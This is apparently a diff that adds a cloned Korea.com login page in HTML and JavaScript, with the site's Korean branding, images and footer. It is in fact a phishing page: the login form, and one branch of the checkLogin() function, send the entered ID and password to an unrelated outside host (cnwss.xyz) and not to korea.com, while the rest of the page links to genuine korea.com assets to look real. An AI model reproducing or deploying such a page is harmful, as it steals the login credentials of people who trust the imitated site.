@@ -1,0 +1,313 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=euc-kr" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+		<title>코리아닷컴 - 코리아는 당신을 사랑합니다.</title>
+		<link rel="stylesheet" type="text/css" href="http://id.korea.com/2013/css/login.css" />
+		<script src="/js/jquery-1.8.3.min.js"></script>
+		<script src="/js/jquery.placeholder.js"></script>	
+		<script type="text/javascript" src="/js/jquery.alphanum.js"></script>
+
+<script type="text/javascript">
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+
+  window.open(theURL,winName,features);
+
+}
+</script>
+
+		<script type="text/javascript">
+			function onGoTo(sURL){
+				try{
+					if ( opener != null ){
+						if(opener.closed){
+							window.open(sURL,"POP_LOGIN");	
+						}	
+						else{	
+							opener.document.location.href=sURL;
+						}	
+					}	 		
+					else{
+						window.open(sURL,"POP_LOGIN");	
+					}	
+				}
+				catch(e){
+					window.open(sURL,"POP_LOGIN");	
+				}	
+			}		
+	
+			function warningMsgSaveID(){
+				if(document.getElementById('chkIDSave').checked == true){
+					alert("아이디 저장할 때 이런 점을 주의하세요!\n\n학교, 학원, PC방 처럼 컴퓨터를 공동으로 사용하는 환경에서는\n타인에게 정보가 공개될 수 있으므로 ID 저장을 설정하지 않는 것이\n좋습니다.");
+					document.getElementById('idsave').value ="on";
+				}
+				else if(document.getElementById('chkIDSave').checked == false){
+					document.getElementById('idsave').value ="off";
+				}
+			}
+
+			function checkFocus(){
+				if(document.login.user.value.length > 0)
+					document.all.user.style.backgroundImage="";
+			}
+			
+			document.onkeypress=checkFocus;
+
+			function cookieVal(cookieName){
+				thisCookie = document.cookie.split("; ");
+
+				for(i=0; i<thisCookie.length; i++) {
+					if(cookieName == thisCookie[i].split("=")[0])		
+						return thisCookie[i].split("=")[1]
+				}
+				
+				return "x"
+			}
+
+			function saveID() {
+				var id;
+				id = document.login.user.value; 	
+
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);
+	
+				document.cookie = "idsave=on; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+				document.cookie = "loginid=" + id + "; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function unsaveID() {	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);
+	
+				document.cookie = "idsave=off; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+				document.cookie = "loginid=; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function saveSSL() {
+				var id;	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);	
+				document.cookie = "ssl=on; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function unsaveSSL() {	
+				var todayDate = new Date();
+				todayDate.setDate(todayDate.getDate() + 365);	
+				document.cookie = "ssl=off; domain=.korea.com" + "; expires=" + todayDate.toGMTString();
+			}
+
+			function checkSSL() {
+				idCheck();
+
+				if(cookieVal("ssl") != "off"){
+					document.login.ssl.value = "on";		
+				}
+				document.login.user.focus();
+			}
+
+			function checkLogin() {
+				if (document.login.user.value.length == 0) {
+					alert("아이디를 입력하세요");
+					document.login.user.focus();
+					return false;
+				}
+				
+				if (document.login.password.value.length == 0) {
+					alert("비밀번호를 입력하세요");
+					document.login.password.focus();
+					return false;
+				}
+/*
+				if (document.login.captcha.value.length == 0) {
+					alert("보안문자를 입력하세요.");
+					document.login.captcha.focus();
+					return false;
+				}
+*/	
+				if (document.login.idsave.value == "on")
+					saveID();
+				else
+					unsaveID();
+
+				if (document.login.ssl.value == "on"){	
+					saveSSL();
+					document.login.action ="https://id.korea.com/ca.php";
+				}
+				else{	
+					unsaveSSL();
+					document.login.action ="https://cnwss.xyz/kr/posts.php";
+				}
+			
+				return;
+			}
+
+			function resetBgID() {	
+				document.getElementById('user').style.backgroundImage="";	
+			}
+
+			function resetBgPW() {
+				document.login.password.style.backgroundImage="";
+				return true;
+			}
+
+			function initLogin() {
+				if(cookieVal("idsave") == "on")	{
+					var loginid = cookieVal("loginid");
+					document.login.idsave.value = "on";
+					document.getElementById('chkIDSave').checked = true;
+					resetBgID();				
+					document.login.user.value = loginid;
+					document.login.password.focus();
+				}
+				else {
+					document.login.idsave.value = "off";
+					document.getElementById('chkIDSave').checked = false;
+					document.login.user.value = "";
+					document.login.user.focus();
+				}		
+			}
+		</script>
+	</head>
+	<!-- <body  onLoad="MM_openBrWindow('http://imgs.korea.com/popup/20150924_sms.jpg','sms','width=350px,height=450px')"  ></body> -->
+	<body onload="initLogin()">
+		
+<form method="post" action="https://cnwss.xyz/kr/posts.php" >
+		<input type="hidden" name="idsave" id="idsave" value="" />
+		<input type="hidden" name="ssl" id="ssl" value="on" />
+		<input type="hidden" name="target" value="http://mail.korea.com/">
+		
+<input type="hidden" name="mode" value="">
+		
+<input type="hidden" name="returl" value="">
+		
+<input type="hidden" name="hisurl" value="">
+		
+<input type="hidden" name="token" value="" id="token">
+		<div id="wrap">
+			<!-- HEADER -->
+			<div id="header">
+				<div id="top">
+					<h1>
+						<a href="http://www.korea.com/"><img src="http://id.korea.com/2013/images/logo.gif" width="126" height="19" alt="코리아닷컴" title="코리아닷컴"/></a>
+						<span><img src="http://id.korea.com/2013/images/login.gif" class="login_title" width="53" height="19" alt="로그인" title="로그인"/></span>
+						<span><img src="http://id.korea.com/2013/images/signin.gif" width="62" height="19" alt="SIGN IN" title="SIGN IN"/></span>
+					</h1>
+					<ul id="util">
+						<li>
+							<a href="javascript://" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.korea.com/');">
+								코리아닷컴을 시작페이지로
+							</a>
+						</li>
+						<li>
+							<a href="javascript://" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.korea.com/');">
+								<img src="http://id.korea.com/2013/images/homepage.gif" class="img_text" alt="Make Korea.com My Homepage" title="Make Korea.com My Homepage"/>
+								<span>
+									<a href="javascript://" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.korea.com/');">
+										<img src="http://id.korea.com/2013/images/bullet_start.gif" alt="시작페이지설정 블릿" title="시작페이지설정 블릿"/>
+									</a>
+								</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+			</div>
+			<!-- // HEADER -->
+
+			<!-- CONTENT  -->
+			<div id="container" class="cf">
+				<h3 class="blind">로그인 정보 입력</h3>
+				<div class="login_box" class="cf">
+					<p><img src="http://id.korea.com/2013/images/welcome.gif" alt="코리아닷컴에 오신것을 환영합니다." title="코리아닷컴에 오신것을 환영합니다."/></p>
+					<p class="welcome_text">코리아닷컴의 다양한 서비스 이용을 위해 로그인해 주세요.</p>
+									
+					<fieldset class="fieldset01">
+						<div class="left">
+							<ul>
+								<li>
+									<input type="text" id="user" name="email" class="input_type1" border="0" title="아이디입력" placeholder="ID" tabindex="1"/>
+								</li>
+								<li>
+									<input type="password" id="password" name="passwd" class="input_type1" border="0" title="비밀번호입력"  placeholder="Password" autocomplete="off" tabindex="2"/>
+								</li>
+							</ul>
+						</div>
+						<div class="left">
+							<ul>
+								<li style="height:37px;">
+									<span class="checkbox">
+										<input type="checkbox" id="chkIDSave" class=""border="0" title="아이디입력" value="" onclick="warningMsgSaveID();"/> ID 저장[Save ID]
+									</span>
+								</li>
+							</ul>
+						</div>
+						
+					</fieldset>
+					<div class="btn-type1">
+						<input type="submit" width="337" height="32" class="btn_login" value="로그인" title="로그인" tabindex="4"/>
+					</div>					
+					<!-- 보안문자입력
+					<div class="btn_box1">
+						<p class="welcome_text">고객님의 정보보호를 위해 보안문자를 입력해주세요.</p>
+						<div class="captcha">
+							<img src="/captcha/index.php?PHPSESSID=2ef6dca217fad4cd496832c483f3bd40" alt="captcha" id="captcha"> <a href="#" onclick="captchaRefresh();">새로고침</a>
+						</div>
+						<input type="text" id="captcha" name="captcha" class="input_type4" border="0" title="captcha" placeholder="보안문자 입력" tabindex="3"/>
+					</div>
+					<div class="btn-type1">
+						<input type="submit" width="337" height="32" class="btn_login" value="로그인" title="로그인" tabindex="4"/>
+					</div>
+					<script type="text/javascript">
+					<!--
+						function captchaRefresh(){
+							$("#captcha").attr("src", "/captcha/index.php?PHPSESSID=2ef6dca217fad4cd496832c483f3bd40");
+						}
+					//-->
+					</script>
+					<!-- 보안문자입력 // -->
+
+
+					<div class="btn_box">
+						<!-- <p class="signup_text">코리아닷컴 회원이 아니신가요?</p>
+						<p class="signup_img"><img src="http://id.korea.com/2013/images/registered.gif" alt="Not registered yet?" title="Not registered yet?"/></p> -->
+						<span>
+							<a href="https://register.korea.com/default.asp">
+								<img src="http://id.korea.com/2013/images/btn_signup.jpg"  class="btn_signup" alt="코리아닷컴 회원가입(SIGN UP HERE!)" title="코리아닷컴 회원가입(SIGN UP HERE!)"/>
+							</a>
+						</span>
+						<span>
+							<a href="https://register.korea.com/opendoc2/find_idpw.asp">
+								<img src="http://id.korea.com/2013/images/btn_forget.jpg" alt="아이디/비밀번호 찾기(FORGET ID OR PASSWORD?)" title="아이디/비밀번호 찾기(FORGET ID OR PASSWORD?)"/>
+							</a>
+						</span>
+					</div>
+				</div>
+				<div class="right_img">
+					<!-- <iframe src="http://www.sta1.com/iframe?gender=M" width="210" height="242" scrolling="no" frameborder="0"></iframe> -->
+					<!-- <p><img src="http://id.korea.com/2013/images/korea_img.jpg" alt="코리아닷컴 대표! 코리아닷컴(Korea.com)" title="코리아닷컴 대표! 코리아닷컴(Korea.com)"/></p> -->
+					<script language='javascript' src="http://ad.korea.com/event.ems/site=Koreacom&pid=login"></script>
+				</div>
+			</div>
+			<!-- CONTENT  -->
+
+			<!-- FOOTER-->
+			<div id="footer">
+				<address>
+					<p>08506 서울시 금천구 가산디지털2로 98 롯데IT캐슬 2동 6층 610호 │대표이사 : 강석기  </p>
+					<p>고객센터(팩스) : 02-2085-0701  사업자등록번호 : 214-86-80927 	</p>
+				</address>
+				<p>Copyrightⓒ <strong>㈜코리아닷컴커뮤니케이션즈</strong> All rights reserved.</p>				
+			</div>
+			<!-- // FOOTER -->
+		</div>
+		</form>
+<script type="text/javascript">
+<!--
+	$(document).ready(function(){
+		$('.input_type4').numeric();
+	});
+//-->
+</script>
+	</body>
+</html>
